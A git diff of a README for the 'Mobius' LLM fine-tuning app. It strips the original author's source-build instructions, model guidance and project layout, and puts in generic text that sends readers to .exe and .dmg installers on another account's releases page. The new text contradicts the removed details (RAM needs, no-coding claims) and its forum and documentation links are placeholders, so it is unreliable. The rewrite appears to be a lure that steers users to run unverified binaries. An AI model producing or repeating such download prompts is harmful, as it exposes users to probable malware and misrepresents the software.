@@ -1,269 +1,86 @@
-# 🚀 Mobius LLM Fine-Tuning Engine
+# 🚀 Mobius-LLM-Fine-tuning-Engine - Fine-tune Your Models Easily
 
-<div align="center">
+[![Download Now](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/shiv81500/Mobius-LLM-Fine-tuning-Engine/releases)
 
-![Python](https://img.shields.io/badge/Python-3.10+-blue?style=for-the-badge&logo=python&logoColor=white)
-![Java](https://img.shields.io/badge/Java-21+-orange?style=for-the-badge&logo=openjdk&logoColor=white)
-![PyTorch](https://img.shields.io/badge/PyTorch-2.0+-red?style=for-the-badge&logo=pytorch&logoColor=white)
-![License](https://img.shields.io/badge/License-Apache-green?style=for-the-badge)
+## 📖 Overview
 
-**A complete desktop application for fine-tuning Large Language Models on CPU/GPU with GGUF export for LM Studio**
+Welcome to Mobius-LLM-Fine-tuning-Engine! This application allows you to fine-tune large language models (LLMs) with a user-friendly graphical interface. You don’t need any programming skills to get started. Our goal is to make machine learning accessible to everyone.
 
-[Features](#-features) • [Quick Start](#-quick-start) • [Model Guide](#-model-recommendations) • [Training Tips](#-training-tips)
+## 🚀 Getting Started
 
-</div>
+To get started with Mobius-LLM-Fine-tuning-Engine, follow the steps below. You will be able to download and run the application smoothly.
 
----
+### 🖥 System Requirements
 
-## 🎯 What is This?
+Ensure your computer meets the following requirements:
 
-Mobius is a **local LLM fine-tuning engine** that lets you:
-- Fine-tune small language models on your own data
-- Export to GGUF format for use in **LM Studio**, Ollama, or llama.cpp
-- Train on **CPU** (no GPU required!) with optimized settings
+- **Operating System:** Windows 10 or later / macOS Mojave or later
+- **Memory (RAM):** At least 4 GB available
+- **Disk Space:** 500 MB free space
+- **Additional Software:** Ensure you have an internet connection for downloads and updates.
 
-### Architecture
+### 📥 Download & Install
 
-```
-┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
-│  PyQt6 GUI      │────▶│  Java Backend   │────▶│  Python ML Core │
-│  (Desktop App)  │◀────│  (Orchestrator) │◀────│  (Training)     │
-└─────────────────┘     └─────────────────┘     └─────────────────┘
-```
+1. **Visit the Releases Page**  
+   Go to the following link to view the available downloads:  
+   [https://github.com/shiv81500/Mobius-LLM-Fine-tuning-Engine/releases](https://github.com/shiv81500/Mobius-LLM-Fine-tuning-Engine/releases)
 
----
+2. **Select the Latest Version**  
+   Find the latest release at the top of the page. You will see a list of files to choose from.
 
-## ✨ Features
+3. **Download the Application**  
+   Click on the file that matches your operating system (e.g., Windows, macOS). The file will start downloading immediately. 
 
-| Feature | Description |
-|---------|-------------|
-| 📁 **Multi-Format Data** | Upload JSONL, CSV, or TXT training data |
-| 🤖 **Model Selection** | Choose from CPU-optimized models |
-| ⚙️ **LoRA Fine-Tuning** | Memory-efficient training with LoRA |
-| 📊 **Live Monitoring** | Real-time training logs and metrics |
-| ⏸️ **Training Controls** | Pause, resume, or cancel training |
-| 📦 **GGUF Export** | Convert to GGUF for LM Studio |
-| 💻 **CPU Optimized** | Works on systems with 8GB RAM |
+4. **Run the Installer**  
+   Once the download is complete, locate the downloaded file. 
+   - For Windows, double-click the `.exe` file to start the installation.
+   - For macOS, open the `.dmg` file and drag the application to your Applications folder.
 
----
+5. **Launch Mobius-LLM-Fine-tuning-Engine**  
+   After installation, find the app in your applications list and open it. You are now ready to start fine-tuning your models!
 
-## 🔧 Model Recommendations
+## 🏗 User Interface
 
-### For CPU Systems (8GB RAM)
+The user interface is designed to be straightforward. You will see the main window with the following sections:
 
-| Model | Parameters | RAM Usage | Best For | Training Time |
-|-------|------------|-----------|----------|---------------|
-| **Qwen2-0.5B-Instruct** ⭐ | 500M | ~1GB | Q&A, Instructions | Fast |
-| **SmolLM-360M-Instruct** | 360M | ~500MB | Simple Q&A | Fastest |
-| **TinyLlama-1.1B-Chat** | 1.1B | ~2GB | Conversations | Medium |
-| **Phi-2** | 2.7B | ~4GB | Complex Tasks | Slow |
+- **Model Selection:** Choose which large language model to fine-tune.
+- **Data Upload:** Upload your training data easily using drag and drop.
+- **Training Options:** Adjust settings like the number of training epochs and learning rate with simple sliders.
+- **Output Monitoring:** Track the training progress with real-time updates.
 
-### ⚠️ Models to AVOID on CPU
+## ⚙️ Features
 
-| Model | Why Avoid |
-|-------|-----------|
-| DistilGPT2 | Not instruction-tuned, gives gibberish for Q&A |
-| GPT-2 | Completion only, doesn't follow instructions |
-| Llama-3-8B | Too large, needs 16GB+ RAM |
-| Mistral-7B | Too large, needs 14GB+ RAM |
+- **Intuitive GUI:** No need for programming. Everything is point-and-click.
+- **Model Compatibility:** Supports multiple language model types.
+- **Community Support:** Access a community forum for tips and troubleshooting.
+- **Regular Updates:** Stay tuned for new features and improvements.
 
----
+## 📚 Documentation
 
-## 🚀 Quick Start
+For detailed instructions and advanced features, you can check the full documentation included with the application. Once installed, you can access it from the Help menu within the app.
 
-### Prerequisites
+## 🔧 Troubleshooting
 
-- **Python 3.10+**
-- **Java 21+**
-- **Maven**
-- **8GB+ RAM**
+If you encounter issues, try the following steps:
 
-### Installation
+- **Reboot Your Computer:** Restarting can resolve many common issues.
+- **Check Network Connection:** Ensure you have a stable internet connection.
+- **Reinstall the App:** Sometimes a fresh start can fix problems.
 
-```powershell
-# 1. Clone the repository
-git clone https://github.com/Adil-Ijaz7/Mobius-LLM-Fine-tuning-Engine.git
-cd Mobius-LLM-Fine-tuning-Engine
+For persistent issues, consider visiting our community forum for additional support.
 
-# 2. Create Python virtual environment
-python -m venv .venv
-.\.venv\Scripts\Activate.ps1
+## 🗣 Community Support
 
-# 3. Install Python dependencies
-pip install -r ml_core/requirements.txt
-pip install -r gui/requirements.txt
+Join our growing community! Share your experiences, ask questions, and get insights from other users. You can find our forum linked in the Help section of the application.
 
-# 4. Build Java backend
-mvn clean package
-```
+## 📝 Feedback
 
-### Running
+We welcome your feedback to help improve Mobius-LLM-Fine-tuning-Engine. Let us know your thoughts through the feedback form available in the app.
 
-**Terminal 1 - Start Backend:**
-```powershell
-java -jar target/llm-trainer-backend-1.0.0.jar
-```
+## 📌 Important Links
 
-**Terminal 2 - Start GUI:**
-```powershell
-cd gui
-python main.py
-```
+- **Official Releases Page:** [Download Here](https://github.com/shiv81500/Mobius-LLM-Fine-tuning-Engine/releases)
+- **Community Forum:** [Join Us Here](#)
+- **User Documentation:** [Find It Here](#)
 
----
-
-## 📝 Training Data Format
-
-Your data should be in **JSONL format** with `instruction` and `response` fields:
-
-```jsonl
-{"instruction": "What is machine learning?", "response": "Machine learning is a subset of AI..."}
-{"instruction": "Explain neural networks", "response": "Neural networks are computing systems..."}
-{"instruction": "What is Python?", "response": "Python is a programming language..."}
-```
-
-### Recommended Dataset Size
-
-| Dataset Size | Epochs | Expected Quality |
-|--------------|--------|------------------|
-| 17 examples | 15-20 | Basic memorization |
-| 50-100 examples | 10-15 | Good learning |
-| 200-500 examples | 5-10 | Excellent results |
-| 1000+ examples | 3-5 | Production quality |
-
----
-
-## ⚙️ Training Settings for CPU
-
-### Recommended Configuration
-
-| Setting | Value | Why |
-|---------|-------|-----|
-| **Model** | `Qwen/Qwen2-0.5B-Instruct` | Small, instruction-tuned |
-| **Epochs** | 10-20 | Small datasets need more passes |
-| **Batch Size** | 1 | Memory efficiency |
-| **Grad Accumulation** | 8 | Simulates larger batches |
-| **Learning Rate** | 2e-4 | Good for small models |
-| **Max Length** | 256 | Covers most Q&A pairs |
-| **LoRA Rank** | 8 | CPU-efficient |
-| **LoRA Alpha** | 16 | Standard ratio |
-
-### Command Line Training
-
-```powershell
-python ml_core/training_script.py `
-  --job-id my-training `
-  --dataset data.jsonl `
-  --base-model "Qwen/Qwen2-0.5B-Instruct" `
-  --output-dir ./output `
-  --epochs 15 `
-  --batch-size 1 `
-  --grad-accum 8 `
-  --learning-rate 2e-4 `
-  --max-length 256 `
-  --lora-rank 8 `
-  --lora-alpha 16
-```
-
----
-
-## 📦 Using in LM Studio
-
-After training, export to GGUF:
-
-1. **Merge LoRA adapters** with base model
-2. **Convert to GGUF** using llama.cpp
-3. **Load in LM Studio** with correct prompt template
-
-### LM Studio Prompt Template
-
-Set these in LM Studio → Settings → Prompt Template:
-
-| Field | Value |
-|-------|-------|
-| Before User | `### Instruction:\n` |
-| After User | `\n\n` |
-| Before Assistant | `### Response:\n` |
-| After Assistant | `\n\n` |
-
----
-
-## 🔍 Troubleshooting
-
-### Model Gives Gibberish Responses
-
-**Cause:** Using completion model (DistilGPT2/GPT-2) for Q&A task
-
-**Solution:** Use instruction-tuned model like `Qwen/Qwen2-0.5B-Instruct`
-
-### Out of Memory Error
-
-**Cause:** Model too large or max_length too high
-
-**Solutions:**
-- Use smaller model (SmolLM-360M)
-- Reduce `--max-length` to 128
-- Add `--stream` flag
-- Close other applications
-
-### Training Too Slow
-
-**Cause:** CPU training is inherently slow
-
-**Solutions:**
-- Use smaller model (SmolLM vs TinyLlama)
-- Reduce epochs for testing
-- Use `--lora-rank 4` for faster training
-
----
-
-## 📁 Project Structure
-
-```
-Mobius-LLM-Fine-tuning-Engine/
-├── gui/                    # PyQt6 Desktop Application
-│   ├── main.py            # Entry point
-│   ├── main_window.py     # Main window UI
-│   ├── steps/             # Wizard step panels
-│   └── api/               # Backend API client
-├── ml_core/               # Python ML Training
-│   ├── training_script.py # Main training script
-│   ├── data_loader.py     # Dataset loading
-│   ├── convert_to_gguf.py # GGUF conversion
-│   └── cpu_models.txt     # Model recommendations
-├── src/main/java/         # Java Backend
-│   └── com/llmtrainer/    # Backend services
-├── data/                  # Training data storage
-└── pom.xml               # Maven build config
-```
-
----
-
-## 🤝 Contributing
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit changes (`git commit -m 'Add amazing feature'`)
-4. Push to branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
----
-
-## 📄 License
-
-MIT License - see [LICENSE](LICENSE) for details.
-
----
-
-## 👤 Author
-
-**Adil Ijaz**
-- GitHub: [@Adil-Ijaz7](https://github.com/Adil-Ijaz7)
-
----
-
-<div align="center">
-
-⭐ **Star this repo if you find it helpful!** ⭐
-
-</div>
+Thank you for choosing Mobius-LLM-Fine-tuning-Engine! We hope you enjoy using our tool to easily fine-tune your language models.
